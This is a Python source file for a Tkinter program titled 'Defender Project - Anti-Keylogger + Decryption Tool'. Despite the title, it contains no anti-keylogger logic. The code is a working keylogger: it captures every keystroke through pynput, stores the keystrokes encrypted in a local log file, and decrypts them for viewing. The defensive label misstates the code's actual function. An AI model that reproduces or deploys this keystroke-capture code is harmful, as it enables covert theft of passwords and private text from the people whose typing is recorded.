import tkinter as tk
from tkinter import messagebox, scrolledtext
from cryptography.fernet import Fernet
from pynput import keyboard
import threading
import datetime
import os

# ---------- CONFIGURATION ----------
KEY_FILE = "key.key"
LOG_FILE = "log.txt"
DECRYPTED_FILE = "decrypted_log.txt"

# ---------- KEY MANAGEMENT ----------
def load_or_generate_key():
    if os.path.exists(KEY_FILE):
        with open(KEY_FILE, 'rb') as f:
            return f.read()
    else:
        key = Fernet.generate_key()
        with open(KEY_FILE, 'wb') as f:
            f.write(key)
        return key

key = load_or_generate_key()
cipher = Fernet(key)

# ---------- KEYLOGGER FUNCTION ----------
def on_press(key_input):
    try:
        log = f'{datetime.datetime.now()} - {key_input.char}\n'
    except AttributeError:
        log = f'{datetime.datetime.now()} - {key_input}\n'
    
    encrypted = cipher.encrypt(log.encode())
    with open(LOG_FILE, 'ab') as f:
        f.write(encrypted + b'\n')

def start_keylogger():
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    messagebox.showinfo("Keylogger", "Keylogger started in background.")

# ---------- DECRYPTION FUNCTION ----------
def decrypt_logs():
    if not os.path.exists(LOG_FILE):
        messagebox.showerror("Error", "No log file found.")
        return

    try:
        with open(LOG_FILE, 'rb') as f:
            lines = f.readlines()

        decrypted_lines = []
        for line in lines:
            try:
                decrypted = cipher.decrypt(line.strip()).decode()
                decrypted_lines.append(decrypted)
            except Exception:
                continue

        with open(DECRYPTED_FILE, 'w', encoding='utf-8') as out_file:
            out_file.write('\n'.join(decrypted_lines))

        # Display in GUI
        output_box.delete(1.0, tk.END)
        output_box.insert(tk.END, '\n'.join(decrypted_lines))

    except Exception as e:
        messagebox.showerror("Error", f"Decryption failed:\n{e}")

# ---------- GUI SETUP ----------
window = tk.Tk()
window.title("Defender Project - Anti-Keylogger + Decryption Tool")
window.geometry("600x500")
window.resizable(False, False)

# Title Label
tk.Label(window, text="🛡️ Defender Project", font=("Arial", 18, "bold")).pack(pady=10)

# Buttons
tk.Button(window, text="Start Keylogger", command=lambda: threading.Thread(target=start_keylogger).start(), bg="#4CAF50", fg="white", width=20).pack(pady=10)
tk.Button(window, text="Decrypt Logs", command=decrypt_logs, bg="#2196F3", fg="white", width=20).pack(pady=10)

# Output Box
tk.Label(window, text="Decrypted Output:", font=("Arial", 12, "bold")).pack(pady=(20, 5))
output_box = scrolledtext.ScrolledText(window, width=70, height=15, font=("Courier", 10))
output_box.pack(padx=10, pady=5)

window.mainloop()
